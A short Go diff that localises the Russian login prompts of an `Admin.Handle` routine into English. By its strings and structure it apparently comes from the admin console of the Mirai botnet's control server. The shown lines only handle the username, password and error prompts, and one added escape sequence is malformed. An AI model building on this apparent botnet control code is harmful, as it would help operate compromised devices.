@@ -35,7 +35,7 @@ func (this *Admin) Handle() {
 
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1user\033[33;3m: \033[0m"))
     username, err := this.ReadLine(false)
     if err != nil {
         return
@@ -43,7 +43,7 @@ func (this *Admin) Handle() {
 
     // Get password
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1mpassword\033[33;3m: \033[0m"))
     password, err := this.ReadLine(true)
     if err != nil {
         return
@@ -53,15 +53,15 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("\r\n"))
     spinBuf := []byte{'-', '\\', '|', '/'}
     for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
+        this.conn.Write(append([]byte("\r\033[37;1mAfter verifying your account... \033[31m"), spinBuf[i % len(spinBuf)]))
         time.Sleep(time.Duration(300) * time.Millisecond)
     }
 
     var loggedIn bool
     var userInfo AccountInfo
     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
+        this.conn.Write([]byte("\r\033[32;1mAn unknown error occurred\r\n"))
+        this.conn.Write([]byte("\033[31mpress any key to exit. (any key)\033[0m"))
         buf := make([]byte, 1)
         this.conn.Read(buf)
         return
